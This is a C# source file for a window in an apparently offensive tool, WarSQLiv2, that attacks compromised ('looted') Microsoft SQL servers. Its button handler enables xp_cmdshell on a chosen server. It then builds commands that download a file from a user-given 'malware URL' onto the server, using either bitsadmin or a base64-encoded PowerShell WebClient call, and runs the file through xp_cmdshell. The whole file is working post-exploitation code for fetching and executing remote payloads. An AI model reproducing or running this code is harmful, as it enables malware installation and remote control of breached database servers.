using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmReverseConnection.xaml
    /// </summary>
    public partial class FrmReverseConnection : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmReverseConnection()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    btnDownloadExecute.Content = _languageControl.SelectedLanguage.GetString("ButtonDownload");
                    lblMalware.Content = _languageControl.SelectedLanguage.GetString("LabelMalwareUrl");
                    lblSaveLocation.Content = _languageControl.SelectedLanguage.GetString("LabelSaveLocation");
                    lblTech.Content = _languageControl.SelectedLanguage.GetString("LabelTechnique");
                    rdBits.Content = _languageControl.SelectedLanguage.GetString("RadioBits");
                    rdPs.Content = _languageControl.SelectedLanguage.GetString("RadioPs");
                    Title = _languageControl.SelectedLanguage.GetString("TitleRevConn");
                    rdPs.IsChecked = true;
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
        }
        private void btnDownloadExecute_Click(object sender, RoutedEventArgs e)
        {
            var isActivated = cmdControl.isActivated;
            var isExecuted = cmdControl.isExecuted;
            if (isActivated == false && isExecuted == false)
            {
                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                try
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        enableXpCmdShell.XpCmdShellStatus();
                        txtStatus.AppendText(enableXpCmdShell.Result);
                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                        if (contains == true)
                        {
                            isActivated = true;
                            isExecuted = true;
                        }
                    });
                }
                catch (Exception)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                    });
                }
            }
            if (isExecuted == true && isActivated == true)
            {
                if (rdBits.IsChecked == true)
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(txtUrl.Text) && !string.IsNullOrEmpty(txtSaveLocation.Text))
                        {
                            var _execCode = string.Empty;
                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                            {
                                _execCode += "USE [master]\r\n";
                                _execCode += "EXEC xp_cmdshell '\"net start BITS\"';\r\n";
                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload1")}");
                                RevConn(_execCode, 0);
                                _execCode += "USE [master]\r\n";
                                _execCode += "EXEC xp_cmdshell '\"bitsadmin /transfer WarSQLiJob /download /priority normal " + txtUrl.Text + " " + txtSaveLocation.Text + "\"';\r\n";
                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload2")}");
                                RevConn(_execCode, 0);
                                _execCode += "USE [master]\r\n";
                                _execCode += "EXEC xp_cmdshell '\"" + txtSaveLocation.Text + "\"';\r\n";
                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload3")}");
                                RevConn(_execCode, 0);
                            });
                        }
                    }
                    catch (Exception exp)
                    {
                        Dispatcher.Invoke((Action)delegate
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        });
                    }
                }
                else
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        var clearText = "(new-object System.Net.WebClient).DownloadFile('" + txtUrl.Text + "', '" + txtSaveLocation.Text + "')";
                        clearText = EncodeBase64.ConvertTextToBase64(clearText);
                        var _execCode = string.Empty;
                        _execCode += "EXEC xp_cmdshell '" + clearText + "'";
                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload5")}");
                        RevConn(_execCode, 1);

                        _execCode = string.Empty;
                        _execCode += "EXEC xp_cmdshell '" + txtSaveLocation.Text + "'\r\n";
                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload3")}");
                        RevConn(_execCode, 0);
                    });
                }
            }
            
        }
        private void RevConn(string execCode, int tech)
        {
            try
            {
                if (lstLooted.SelectedIndex != -1)
                {
                    if (tech == 0)
                    {
                        try
                        {
                            Dispatcher.Invoke((Action)delegate
                            {
                                _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                                _postExploitation.ExploitCode = execCode;
                                _postExploitation.RunExploit();
                                txtStatus.AppendText(_postExploitation.ExploitResult);
                            });                            
                        }
                        catch (Exception exp)
                        {
                            Dispatcher.Invoke((Action)delegate
                            {
                                txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                            });
                        }
                    }
                    else
                    {
                        try
                        {
                            Dispatcher.Invoke((Action)delegate
                            {
                                _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                                _postExploitation.ExploitCode = execCode;
                                _postExploitation.RunExploit();
                                var result = _postExploitation.ExploitResult;
                                if(result == "\r\n")
                                {
                                    txtStatus.AppendText(Environment.NewLine + _languageControl.SelectedLanguage.GetString("MessageDownload4"));
                                }
                            });
                        }
                        catch (Exception exp)
                        {
                            Dispatcher.Invoke((Action)delegate
                            {
                                txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                            });
                        }
                    }
                }
                else
                {
                    Dispatcher.Invoke((Action)delegate
                    {
                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageExploitError1")}");
                    });
                }
            }
            catch (Exception exp)
            {
                Dispatcher.Invoke((Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });
            }
        }
    }
}
